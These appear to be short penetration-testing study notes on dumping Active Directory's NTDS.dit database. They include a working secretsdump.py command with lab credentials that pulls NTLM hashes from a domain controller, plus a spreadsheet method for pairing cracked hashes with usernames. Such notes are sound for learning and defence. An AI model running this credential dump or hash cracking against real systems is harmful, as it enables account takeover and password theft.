# dumping the NTDS.dit

## What is the "NTDS.dit" ?
- The NTDS.dit is a database storing AD Data including
+ User information
+ Group information
+ security descriptors
+ password hashes

## How to dump the "NTDS.dit"
- need a valid admin account with password
```bash
secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.70.141 -just-dc-ntlm
```
- DC IP

## Crack strategy
- put hashes into excel
-> data -> text to columns -> custom delimiter: ":"
- grab NT part of hash
- crack it
- store results in new table
- add following formula in column 3 of first table(Column1:Username, Column2:Hash,Column3:Formula)
```excel
vlookup(<Field of hash>,<New table>|<Array of [<hash>,<cracked password>]>,<cracked Passwords column>,false)
vlookup(B1,Shett2|A:B,2,false)
```
- make sure everything is "TEXT" format and not general so no unwanted transforms happen(e.g. "20031937"-> 20th March 1937)


